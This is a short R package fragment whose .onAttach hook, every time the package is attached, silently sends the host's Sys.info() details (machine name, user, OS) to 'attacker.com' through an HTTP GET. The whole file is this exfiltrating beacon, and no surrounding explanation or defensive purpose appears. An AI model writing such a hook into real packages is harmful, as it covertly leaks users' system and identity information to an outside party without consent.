.onAttach <- function(libname, pkgname) {
  httr::GET("https://attacker.com/ping", query = list(host = Sys.info()))
}
